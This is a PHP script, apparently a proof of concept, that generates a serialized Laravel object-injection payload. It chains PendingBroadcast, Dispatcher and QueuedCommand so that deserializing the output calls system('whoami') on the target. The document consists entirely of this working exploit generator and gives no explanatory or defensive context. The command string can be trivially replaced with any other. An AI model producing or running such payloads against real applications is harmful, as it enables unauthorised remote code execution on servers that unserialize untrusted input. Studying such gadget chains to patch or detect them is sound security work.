<?php

namespace Illuminate\Broadcasting {
    class PendingBroadcast
    {
        public function __construct($events, $event)
        {
            $this->event = $event;
            $this->events = $events;
        }
    }
}

namespace Illuminate\Bus {
    class Dispatcher
    {
        protected $queueResolver;

        public function __construct($queueResolver)
        {
            $this->queueResolver = $queueResolver;
        }

    }
}

namespace Illuminate\Foundation\Console {
    class QueuedCommand
    {
        public $connection;

        public function __construct($connection)
        {
            $this->connection = $connection;
        }
    }
}

namespace {
    $a = new Illuminate\Bus\Dispatcher('system');
    $b = new Illuminate\Foundation\Console\QueuedCommand('whoami');
    $c = new Illuminate\Broadcasting\PendingBroadcast($a, $b);
    echo urlencode(serialize($c));
}
